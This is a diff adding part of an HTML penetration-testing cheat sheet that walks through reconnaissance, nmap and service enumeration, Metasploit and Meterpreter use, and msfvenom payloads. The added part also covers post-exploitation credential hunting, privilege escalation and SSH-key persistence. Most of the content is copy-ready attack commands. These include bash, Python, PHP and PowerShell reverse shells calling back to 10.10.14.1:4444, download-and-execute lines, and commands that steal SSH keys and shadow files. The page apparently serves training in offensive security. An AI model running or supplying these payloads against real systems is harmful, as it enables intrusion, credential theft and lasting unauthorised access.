+        <pre><span class="c"># ── WEB FINGERPRINTING ───────────────────────</span>
+<span class="f">whatweb</span> <span class="v">-a 3</span> https://target.com      <span class="c"># tech stack ID</span>
+<span class="f">wappalyzer</span> https://target.com         <span class="c"># browser ext or CLI</span>
+curl <span class="v">-sI</span> https://target.com | grep <span class="v">-iE</span> <span class="s">"server|powered|tech"</span>
+
+<span class="c"># ── DIRECTORY BRUTE FORCE ────────────────────</span>
+<span class="f">gobuster</span> dir <span class="v">-u</span> https://target.com \
+  <span class="v">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  <span class="v">-x</span> php,html,txt,bak,zip <span class="v">-t 50</span>
+
+<span class="f">ffuf</span> <span class="v">-u</span> https://target.com/FUZZ \
+  <span class="v">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  <span class="v">-mc</span> 200,301,302,401,403 <span class="v">-t 50</span>
+
+<span class="c"># ── SUBDOMAIN BRUTE FORCE ────────────────────</span>
+<span class="f">gobuster</span> dns <span class="v">-d</span> target.com \
+  <span class="v">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+<span class="f">ffuf</span> <span class="v">-u</span> https://FUZZ.target.com \
+  <span class="v">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  <span class="v">-fw 1</span>   <span class="c"># filter by word count (remove wildcard)</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S3 · SCANNING & ENUMERATION
+══════════════════════════════════════════════════ -->
+<section class="section" id="s3">
+  <div class="sec-kicker"><div class="sec-num">03</div><div class="sec-tag">Phase 2</div></div>
+  <div class="sec-title">Scanning & Enumeration</div>
+  <p class="sec-brief">Systematically identifying open ports, running services, their versions, and enumerating everything accessible — users, shares, vulnerabilities.</p>
+
+  <div class="phase-card pc-scan always">
+    <div class="pc-header">
+      <div class="pc-phase-num">3</div>
+      <div class="pc-info">
+        <div class="pc-name">Nmap — The Complete Reference</div>
+        <div class="pc-desc">Network scanner — your first tool on every engagement</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-b">Nmap</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">nmap — full reference</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── DISCOVERY ───────────────────────────────────────────</span>
+<span class="f">nmap</span> <span class="v">-sn</span> <span class="s">192.168.1.0/24</span>              <span class="c"># ping sweep, host discovery</span>
+<span class="f">nmap</span> <span class="v">-sn -PS22,80,443</span> <span class="s">192.168.1.0/24</span> <span class="c"># TCP SYN discovery</span>
+
+<span class="c"># ── STANDARD SCANS ──────────────────────────────────────</span>
+<span class="f">nmap</span> <span class="s">192.168.1.5</span>                       <span class="c"># default 1000 ports</span>
+<span class="f">nmap</span> <span class="v">-p-</span> <span class="s">192.168.1.5</span>                   <span class="c"># ALL 65535 ports (slow)</span>
+<span class="f">nmap</span> <span class="v">-p 22,80,443,8080</span> <span class="s">192.168.1.5</span>    <span class="c"># specific ports</span>
+
+<span class="c"># ── VERSION + SCRIPT + OS DETECTION ─────────────────────</span>
+<span class="f">nmap</span> <span class="v">-sV</span> <span class="s">192.168.1.5</span>                  <span class="c"># service version</span>
+<span class="f">nmap</span> <span class="v">-sC</span> <span class="s">192.168.1.5</span>                  <span class="c"># default NSE scripts</span>
+<span class="f">nmap</span> <span class="v">-sV -sC -O</span> <span class="s">192.168.1.5</span>           <span class="c"># version + scripts + OS</span>
+<span class="f">nmap</span> <span class="v">-A</span> <span class="s">192.168.1.5</span>                   <span class="c"># aggressive (all of above)</span>
+
+<span class="c"># ── STEALTH SCANS ────────────────────────────────────────</span>
+sudo <span class="f">nmap</span> <span class="v">-sS</span> <span class="s">192.168.1.5</span>              <span class="c"># SYN scan (default as root)</span>
+<span class="f">nmap</span> <span class="v">-sN</span> <span class="s">192.168.1.5</span>                  <span class="c"># NULL scan (FW evasion)</span>
+<span class="f">nmap</span> <span class="v">-sF</span> <span class="s">192.168.1.5</span>                  <span class="c"># FIN scan</span>
+<span class="f">nmap</span> <span class="v">-sX</span> <span class="s">192.168.1.5</span>                  <span class="c"># Xmas scan</span>
+
+<span class="c"># ── UDP SCAN ─────────────────────────────────────────────</span>
+sudo <span class="f">nmap</span> <span class="v">-sU -top-ports 100</span> <span class="s">192.168.1.5</span>  <span class="c"># top 100 UDP ports</span>
+
+<span class="c"># ── VULNERABILITY SCRIPTS ────────────────────────────────</span>
+<span class="f">nmap</span> <span class="v">--script vuln</span> <span class="s">192.168.1.5</span>        <span class="c"># all vuln scripts</span>
+<span class="f">nmap</span> <span class="v">--script smb-vuln-ms17-010</span> <span class="s">192.168.1.5</span>  <span class="c"># EternalBlue</span>
+<span class="f">nmap</span> <span class="v">--script http-enum</span> <span class="s">192.168.1.5</span>   <span class="c"># web dirs</span>
+
+<span class="c"># ── SPEED / TIMING ───────────────────────────────────────</span>
+<span class="f">nmap</span> <span class="v">-T4</span> <span class="s">192.168.1.5</span>                  <span class="c"># T0=slow→T5=insane</span>
+<span class="f">nmap</span> <span class="v">--min-rate 5000</span> <span class="s">192.168.1.5</span>     <span class="c"># packets per second</span>
+
+<span class="c"># ── OUTPUT ───────────────────────────────────────────────</span>
+<span class="f">nmap</span> <span class="v">-oA</span> <span class="s">./scan_results 192.168.1.5</span>  <span class="c"># all formats (nmap/xml/gnmap)</span>
+<span class="f">nmap</span> <span class="v">-oN</span> <span class="s">normal.txt</span> <span class="v">-oX</span> <span class="s">xml.xml</span> <span class="s">target</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="phase-card pc-scan" id="pc-enum">
+    <div class="pc-header" onclick="tog('pc-enum')">
+      <div class="pc-phase-num">3</div>
+      <div class="pc-info">
+        <div class="pc-name">Service-Specific Enumeration</div>
+        <div class="pc-desc">Extract maximum intelligence from each open service</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-b">Enum</span><span class="pc-chev">▾</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">service enumeration by port</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── FTP (21) ──────────────────────────────────────────────</span>
+<span class="f">ftp</span> <span class="s">192.168.1.5</span>            <span class="c"># try anonymous / anonymous login</span>
+<span class="f">nmap</span> <span class="v">--script ftp-anon,ftp-bounce,ftp-syst</span> <span class="v">-p 21</span> target
+
+<span class="c"># ── SSH (22) ──────────────────────────────────────────────</span>
+<span class="f">ssh</span> <span class="v">-v</span> user@target            <span class="c"># check auth methods, host keys</span>
+<span class="f">nmap</span> <span class="v">--script ssh-auth-methods -p 22</span> target
+<span class="f">nmap</span> <span class="v">--script ssh2-enum-algos -p 22</span> target
+
+<span class="c"># ── SMB (445/139) ─────────────────────────────────────────</span>
+<span class="f">smbclient</span> <span class="v">-L</span> //192.168.1.5 <span class="v">-N</span>    <span class="c"># list shares (null session)</span>
+<span class="f">smbclient</span> //192.168.1.5/share <span class="v">-N</span>  <span class="c"># connect to share</span>
+<span class="f">enum4linux</span> <span class="v">-a</span> 192.168.1.5          <span class="c"># full SMB/RPC enumeration</span>
+<span class="f">enum4linux-ng</span> <span class="v">-A</span> 192.168.1.5       <span class="c"># modern version</span>
+<span class="f">crackmapexec</span> smb 192.168.1.5 <span class="v">-u '' -p ''</span>  <span class="c"># CME null session</span>
+
+<span class="c"># ── HTTP/HTTPS (80/443) ────────────────────────────────────</span>
+<span class="f">nikto</span> <span class="v">-h</span> https://192.168.1.5     <span class="c"># web vulnerability scan</span>
+<span class="f">gobuster</span> dir <span class="v">-u</span> http://target <span class="v">-w</span> /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+<span class="f">feroxbuster</span> <span class="v">-u</span> http://target <span class="v">-t 50 -w</span> wordlist.txt
+
+<span class="c"># ── MYSQL (3306) ──────────────────────────────────────────</span>
+<span class="f">mysql</span> <span class="v">-u root -p -h</span> 192.168.1.5   <span class="c"># connect to MySQL</span>
+<span class="f">nmap</span> <span class="v">--script mysql-enum,mysql-info -p 3306</span> target
+
+<span class="c"># ── RDP (3389) ────────────────────────────────────────────</span>
+<span class="f">nmap</span> <span class="v">--script rdp-enum-encryption -p 3389</span> target
+<span class="f">xfreerdp</span> /v:192.168.1.5 /u:admin /p:password
+
+<span class="c"># ── SNMP (UDP 161) ────────────────────────────────────────</span>
+<span class="f">snmpwalk</span> <span class="v">-c public -v1</span> 192.168.1.5    <span class="c"># community string: public</span>
+<span class="f">snmpwalk</span> <span class="v">-c public -v2c</span> 192.168.1.5
+<span class="f">onesixtyone</span> <span class="v">-c</span> /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.5</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S4 · EXPLOITATION
+══════════════════════════════════════════════════ -->
+<section class="section" id="s4">
+  <div class="sec-kicker"><div class="sec-num">04</div><div class="sec-tag">Phase 3 — Core</div></div>
+  <div class="sec-title">Exploitation</div>
+  <p class="sec-brief">Gaining initial access to target systems by exploiting identified vulnerabilities. The goal is a shell — interactive command execution on the target.</p>
+
+  <div class="phase-card pc-exploit always">
+    <div class="pc-header">
+      <div class="pc-phase-num">4</div>
+      <div class="pc-info">
+        <div class="pc-name">Metasploit Framework</div>
+        <div class="pc-desc">The industry-standard exploitation framework — 2000+ modules</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-r">MSF</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="diagram"><span class="dh">METASPLOIT ARCHITECTURE</span>
+
+<span class="db">msfconsole</span> → Interface
+  ├── <span class="dy">Exploits</span>    → Take advantage of vulnerabilities
+  ├── <span class="dy">Payloads</span>    → Code that runs after exploit (shell, meterpreter)
+  ├── <span class="dy">Auxiliary</span>  → Scanning, enumeration, fuzzing
+  ├── <span class="dy">Post</span>        → Post-exploitation modules
+  ├── <span class="dy">Encoders</span>   → AV evasion
+  └── <span class="dy">NOPs</span>        → Shellcode padding
+
+<span class="dg">Payload Types:</span>
+  <span class="dg">Singles</span>     → Self-contained, stable (bind/reverse shell)
+  <span class="dg">Stagers</span>     → Small payload that pulls down larger Stage
+  <span class="dg">Stages</span>      → Complex payloads: Meterpreter, VNC, Shell
+  
+  <span class="dg">windows/meterpreter/reverse_tcp</span> ← most common</div>
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">metasploit essential commands</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">msf</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── STARTUP & SEARCH ──────────────────────────────────</span>
+msfconsole                              <span class="c"># start MSF</span>
+msfconsole <span class="v">-q</span>                          <span class="c"># quiet mode (no banner)</span>
+search <span class="s">eternalblue</span>                    <span class="c"># search for modules</span>
+search <span class="v">type:exploit name:smb</span>          <span class="c"># filter by type+name</span>
+use <span class="v">0</span>                                   <span class="c"># use first search result</span>
+use <span class="s">exploit/windows/smb/ms17_010_eternalblue</span>
+
+<span class="c"># ── MODULE USAGE ──────────────────────────────────────</span>
+info                                    <span class="c"># module details</span>
+options                                 <span class="c"># show required options</span>
+show payloads                           <span class="c"># compatible payloads</span>
+set RHOSTS <span class="s">192.168.1.5</span>                <span class="c"># set target</span>
+set LHOST <span class="s">192.168.1.100</span>               <span class="c"># your IP (for reverse)</span>
+set LPORT <span class="v">4444</span>                         <span class="c"># listening port</span>
+set PAYLOAD <span class="s">windows/x64/meterpreter/reverse_tcp</span>
+run   <span class="c"># or: exploit</span>
+
+<span class="c"># ── METERPRETER COMMANDS ──────────────────────────────</span>
+sysinfo                                 <span class="c"># system information</span>
+getuid                                  <span class="c"># current user</span>
+getsystem                               <span class="c"># attempt privilege escalation</span>
+hashdump                                <span class="c"># dump password hashes</span>
+shell                                   <span class="c"># drop to OS shell</span>
+ps                                      <span class="c"># list processes</span>
+migrate <span class="v">1234</span>                           <span class="c"># migrate to PID</span>
+upload /local/file.exe C:\\target\      <span class="c"># upload file</span>
+download C:\\secret.txt /local/         <span class="c"># download file</span>
+keyscan_start                           <span class="c"># start keylogger</span>
+keyscan_dump                            <span class="c"># dump keystrokes</span>
+screenshot                              <span class="c"># take screenshot</span>
+background                              <span class="c"># background session</span>
+sessions <span class="v">-l</span>                            <span class="c"># list all sessions</span>
+sessions <span class="v">-i 1</span>                          <span class="c"># interact with session 1</span>
+run post/multi/recon/local_exploit_suggester  <span class="c"># privesc suggestions!</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="phase-card pc-exploit" id="pc-shells">
+    <div class="pc-header" onclick="tog('pc-shells')">
+      <div class="pc-phase-num">4</div>
+      <div class="pc-info">
+        <div class="pc-name">Reverse Shells — Getting a Shell Without Metasploit</div>
+        <div class="pc-desc">Manual shell techniques — essential when MSF is blocked or overkill</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-r">Shells</span><span class="pc-chev">▾</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="note na">
+        <div class="note-lbl">Bind vs Reverse Shell</div>
+        <strong>Bind shell:</strong> Target listens, attacker connects TO target. Blocked by firewalls.<br>
+        <strong>Reverse shell:</strong> Target connects BACK to attacker. Bypasses inbound firewall rules. Always prefer reverse shells.
+      </div>
+      <div class="g2">
+        <div>
+          <div class="payload"><span class="pl-lbl">// Set up listener first (always)</span>
+nc -nlvp 4444
+# OR Metasploit multi/handler:
+use exploit/multi/handler
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST 10.10.14.1
+set LPORT 4444
+run
+
+<span class="pl-lbl">// Bash Reverse Shells</span>
+bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
+exec 5<>/dev/tcp/10.10.14.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
+
+<span class="pl-lbl">// Python Reverse Shell</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+<span class="pl-lbl">// PHP Reverse Shell (web exploit)</span>
+php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+<span class="pl-lbl">// PowerShell (Windows)</span>
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</div>
+        </div>
+        <div>
+          <div class="code">
+            <div class="code-bar"><div class="cb-l"><span class="code-title">shell upgrade — dumb → full TTY</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+            <pre><span class="c"># Upgrade a basic shell to full interactive TTY</span>
+<span class="c"># Method 1: Python PTY</span>
+python3 <span class="v">-c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="c"># Ctrl+Z (background)</span>
+stty raw <span class="v">-echo</span>; fg
+export TERM=xterm
+stty rows <span class="v">40</span> cols <span class="v">120</span>
+
+<span class="c"># Method 2: socat (if available)</span>
+<span class="c"># Attacker:</span>
+socat file:`tty`,raw,echo=0 tcp-listen:<span class="v">4444</span>
+<span class="c"># Target:</span>
+socat exec:<span class="s">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="v">10.10.14.1:4444</span>
+
+<span class="c"># Method 3: script command</span>
+script <span class="v">/dev/null -c bash</span>
+
+<span class="c"># Method 4: rlwrap (before connecting)</span>
+rlwrap nc <span class="v">-nlvp</span> <span class="v">4444</span></pre>
+          </div>
+          <div class="code" style="margin-top:12px">
+            <div class="code-bar"><div class="cb-l"><span class="code-title">msfvenom — generate payloads</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+            <pre><span class="c"># Windows EXE reverse shell</span>
+msfvenom <span class="v">-p windows/x64/meterpreter/reverse_tcp</span> \
+  <span class="v">LHOST=10.10.14.1 LPORT=4444</span> \
+  <span class="v">-f exe -o</span> shell.exe
+
+<span class="c"># Linux ELF reverse shell</span>
+msfvenom <span class="v">-p linux/x86/meterpreter/reverse_tcp</span> \
+  <span class="v">LHOST=10.10.14.1 LPORT=4444</span> \
+  <span class="v">-f elf -o</span> shell.elf
+
+<span class="c"># PHP web shell</span>
+msfvenom <span class="v">-p php/meterpreter_reverse_tcp</span> \
+  <span class="v">LHOST=10.10.14.1 LPORT=4444</span> \
+  <span class="v">-f raw -o</span> shell.php
+
+<span class="c"># Java WAR file (Tomcat)</span>
+msfvenom <span class="v">-p java/jsp_shell_reverse_tcp</span> \
+  <span class="v">LHOST=10.10.14.1 LPORT=4444</span> \
+  <span class="v">-f war -o</span> shell.war</pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S5 · POST-EXPLOITATION
+══════════════════════════════════════════════════ -->
+<section class="section" id="s5">
+  <div class="sec-kicker"><div class="sec-num">05</div><div class="sec-tag">Phase 4</div></div>
+  <div class="sec-title">Post-Exploitation</div>
+  <p class="sec-brief">What to do after initial shell access — enumerate the host, harvest credentials, establish persistence, and identify paths forward.</p>
+
+  <div class="phase-card pc-post always">
+    <div class="pc-header">
+      <div class="pc-phase-num">5</div>
+      <div class="pc-info">
+        <div class="pc-name">First 5 Minutes on a Compromised Host</div>
+        <div class="pc-desc">Immediate enumeration after getting a shell</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-p">Post-Exploit</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">immediate post-exploitation enumeration</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── WHO + WHERE ──────────────────────────────────────────</span>
+<span class="f">id</span>; whoami; hostname              <span class="c"># who am I, what machine</span>
+<span class="f">uname</span> <span class="v">-a</span>; cat /etc/os-release    <span class="c"># OS and kernel version</span>
+<span class="f">ip</span> addr; ip route                 <span class="c"># network info + other networks</span>
+<span class="f">cat</span> /etc/hosts                    <span class="c"># internal hostnames</span>
+<span class="f">env</span> | grep <span class="v">-i</span> <span class="s">"pass\|key\|token\|secret"</span>  <span class="c"># env var secrets!</span>
+
+<span class="c"># ── USERS + GROUPS ───────────────────────────────────────</span>
+<span class="f">cat</span> /etc/passwd | grep <span class="v">-v</span> nologin  <span class="c"># users with shells</span>
+<span class="f">sudo</span> <span class="v">-l</span>                             <span class="c"># CRITICAL: sudo permissions</span>
+<span class="f">id</span>; groups                         <span class="c"># group memberships</span>
+<span class="f">last</span>; w                            <span class="c"># who's logged in / was</span>
+
+<span class="c"># ── FIND SENSITIVE FILES ─────────────────────────────────</span>
+<span class="f">find</span> / <span class="v">-name</span> <span class="s">"*.txt"</span> <span class="v">-readable 2</span>/dev/null | head -20
+<span class="f">find</span> / <span class="v">-name</span> <span class="s">"*.conf" -readable 2</span>/dev/null
+<span class="f">find</span> / <span class="v">-name</span> <span class="s">".bash_history" -readable 2</span>/dev/null | xargs cat
+<span class="f">find</span> / <span class="v">-name</span> <span class="s">"id_rsa" -o -name "id_ecdsa" 2</span>/dev/null
+<span class="f">cat</span> ~/.bash_history                <span class="c"># previous commands!</span>
+
+<span class="c"># ── INTERNAL NETWORK DISCOVERY ───────────────────────────</span>
+<span class="f">ss</span> <span class="v">-tulpn</span>                          <span class="c"># listening ports (internal services)</span>
+<span class="f">arp</span> <span class="v">-a</span>; ip neigh                   <span class="c"># known hosts on LAN</span>
+<span class="f">for</span> i <span class="k">in</span> {1..254}; <span class="k">do</span> ping <span class="v">-c1 -W1</span> 10.10.10.$i &amp;>/dev/null &amp;&amp; echo "UP: 10.10.10.$i"; done
+
+<span class="c"># ── CREDENTIAL HUNTING ───────────────────────────────────</span>
+<span class="f">grep</span> <span class="v">-rn</span> <span class="s">"password\|passwd\|secret\|api_key"</span> /var/www/ 2/dev/null
+<span class="f">cat</span> /var/www/html/config.php 2/dev/null
+<span class="f">cat</span> /var/www/html/.env 2/dev/null
+<span class="f">cat</span> /home/*/.ssh/id_rsa 2/dev/null  <span class="c"># steal SSH private keys</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="phase-card pc-post" id="pc-transfer">
+    <div class="pc-header" onclick="tog('pc-transfer')">
+      <div class="pc-phase-num">5</div>
+      <div class="pc-info">
+        <div class="pc-name">File Transfer Techniques</div>
+        <div class="pc-desc">Moving tools and files to/from compromised hosts</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-p">Transfer</span><span class="pc-chev">▾</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">file transfer methods</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── PYTHON HTTP SERVER (Attacker hosts, Target downloads) ─</span>
+<span class="c"># Attacker machine:</span>
+python3 <span class="v">-m</span> http.server <span class="v">8080</span>         <span class="c"># in dir with tools</span>
+<span class="c"># Target (Linux):</span>
+wget http://10.10.14.1:8080/linpeas.sh <span class="v">-O</span> /tmp/linpeas.sh
+curl http://10.10.14.1:8080/tool <span class="v">-o</span> /tmp/tool
+<span class="c"># Target (Windows PowerShell):</span>
+Invoke-WebRequest http://10.10.14.1:8080/shell.exe <span class="v">-OutFile</span> C:\temp\shell.exe
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8080/script.ps1')
+
+<span class="c"># ── SMB (Windows targets) ─────────────────────────────────</span>
+<span class="c"># Attacker: set up SMB server</span>
+impacket-smbserver share /tmp/share
+<span class="c"># Target (Windows CMD):</span>
+copy \\10.10.14.1\share\file.exe .
+<span class="c"># Run directly without downloading:</span>
+\\10.10.14.1\share\nc.exe 10.10.14.1 4444 <span class="v">-e</span> cmd.exe
+
+<span class="c"># ── BASE64 (when nothing else works) ─────────────────────</span>
+<span class="c"># Attacker: encode file</span>
+base64 <span class="v">-w 0</span> linpeas.sh > linpeas.b64
+<span class="c"># Target: decode and run</span>
+echo "BASE64DATA" | base64 <span class="v">-d</span> > /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh
+
+<span class="c"># ── SCP / RSYNC ────────────────────────────────────────────</span>
+scp user@target:/etc/shadow /tmp/shadow    <span class="c"># from target</span>
+scp /tmp/linpeas.sh user@target:/tmp/      <span class="c"># to target</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S6 · PRIVILEGE ESCALATION
+══════════════════════════════════════════════════ -->
+<section class="section" id="s6">
+  <div class="sec-kicker"><div class="sec-num">06</div><div class="sec-tag">Critical Phase</div></div>
+  <div class="sec-title">Privilege Escalation</div>
+  <p class="sec-brief">Elevating from a low-privileged shell to root/SYSTEM. The most important post-exploitation skill. Automated tools find paths, manual techniques close deals.</p>
+
+  <div class="g2">
+    <div>
+      <h3 style="font-family:var(--stencil);font-size:16px;letter-spacing:.1em;color:var(--amber2);text-transform:uppercase;margin-bottom:12px">Linux Privilege Escalation</h3>
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">LinPEAS + manual checks</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── AUTOMATED ENUMERATION ─────────────────────────</span>
+<span class="c"># LinPEAS — most comprehensive Linux privesc enum</span>
+curl <span class="v">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+
+<span class="c"># LinEnum — alternative</span>
+./LinEnum.sh <span class="v">-t</span>
+
+<span class="c"># ── SUDO ABUSE ────────────────────────────────────</span>
+sudo <span class="v">-l</span>                          <span class="c"># ALWAYS run first!</span>
+<span class="c"># (ALL) NOPASSWD: /usr/bin/find</span>
+sudo find . <span class="v">-exec</span> /bin/bash \; <span class="v">-quit</span>  <span class="c"># → root!</span>
+<span class="c"># (ALL) NOPASSWD: /usr/bin/vim</span>
+sudo vim <span class="v">-c</span> <span class="s">':!/bin/bash'</span>       <span class="c"># → root!</span>
+<span class="c"># (ALL) NOPASSWD: /usr/bin/python3</span>
+sudo python3 <span class="v">-c</span> <span class="s">'import os; os.system("/bin/bash")'</span>
+
+<span class="c"># ── SUID BINARIES ─────────────────────────────────</span>
+find / <span class="v">-perm -u=s -type f 2</span>/dev/null
+<span class="c"># Check each on: gtfobins.github.io</span>
+<span class="c"># Example: SUID bash</span>
+bash <span class="v">-p</span>                          <span class="c"># → root shell!</span>
+
+<span class="c"># ── CRON JOBS ─────────────────────────────────────</span>
+cat /etc/crontab
+ls <span class="v">-la</span> /etc/cron.d/ /etc/cron.daily/
+<span class="c"># If cron runs world-writable script:</span>
+echo <span class="s">"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"</span> >> /vuln/script.sh
+
+<span class="c"># ── CAPABILITIES ──────────────────────────────────</span>
+getcap <span class="v">-r /</span> 2/dev/null
+<span class="c"># cap_setuid+ep on python → instant root:</span>
+/usr/bin/python3.8 <span class="v">-c</span> <span class="s">"import os; os.setuid(0); os.system('/bin/bash')"</span>
+
+<span class="c"># ── KERNEL EXPLOITS ───────────────────────────────</span>
+uname <span class="v">-a</span>             <span class="c"># get kernel version</span>
+<span class="c"># Search exploit-db: linux kernel 5.x.x</span>
+<span class="c"># DirtyCow, DirtyPipe, OverlayFS, etc.</span></pre>
+      </div>
+    </div>
+    <div>
+      <h3 style="font-family:var(--stencil);font-size:16px;letter-spacing:.1em;color:var(--amber2);text-transform:uppercase;margin-bottom:12px">Windows Privilege Escalation</h3>
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">WinPEAS + manual Windows privesc</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">powershell</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── AUTOMATED ENUM ────────────────────────────────</span>
+.\WinPEAS.exe          <span class="c"># download from PEASS-ng</span>
+.\PowerUp.ps1; Invoke-AllChecks
+
+<span class="c"># ── BASIC INFO ────────────────────────────────────</span>
+whoami /all            <span class="c"># privileges + groups</span>
+systeminfo             <span class="c"># OS version + hotfixes</span>
+net user               <span class="c"># local users</span>
+net localgroup administrators  <span class="c"># who's admin?</span>
+
+<span class="c"># ── UNQUOTED SERVICE PATHS ────────────────────────</span>
+<span class="c"># Service path: C:\Program Files\My App\service.exe</span>
+<span class="c"># If path has spaces and no quotes → place</span>
+<span class="c"># C:\Program.exe or C:\Program Files\My.exe</span>
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
+
+<span class="c"># ── TOKEN IMPERSONATION (Potato attacks) ──────────</span>
+whoami /priv           <span class="c"># look for SeImpersonatePrivilege</span>
+<span class="c"># If present: JuicyPotato, PrintSpoofer, GodPotato</span>
+.\PrintSpoofer.exe <span class="v">-i -c</span> cmd    <span class="c"># → SYSTEM shell</span>
+.\GodPotato.exe <span class="v">-cmd</span> <span class="s">"cmd /c whoami"</span>
+
+<span class="c"># ── ALWAYS INSTALL ELEVATED ───────────────────────</span>
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="c"># If both = 1, create malicious MSI:</span>
+msfvenom <span class="v">-p windows/x64/shell_reverse_tcp</span> LHOST=IP LPORT=4444 <span class="v">-f msi -o</span> evil.msi
+msiexec /quiet /qn /i evil.msi  <span class="c"># runs as SYSTEM!</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S7 · PERSISTENCE & PIVOTING
+══════════════════════════════════════════════════ -->
+<section class="section" id="s7">
+  <div class="sec-kicker"><div class="sec-num">07</div><div class="sec-tag">Phase 4 — Advanced</div></div>
+  <div class="sec-title">Persistence & Pivoting</div>
+  <p class="sec-brief">Maintaining access across reboots, and using a compromised host as a launching point to attack deeper network segments.</p>
+
+  <div class="g2">
+    <div>
+      <h3 style="font-family:var(--stencil);font-size:14px;letter-spacing:.1em;color:var(--amber);text-transform:uppercase;margin-bottom:12px">Persistence Techniques</h3>
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">maintaining access</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ── LINUX PERSISTENCE ─────────────────────────────</span>
+<span class="c"># Method 1: Add SSH key</span>
+mkdir -p ~/.ssh
+echo "ssh-rsa YOURPUBKEY" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
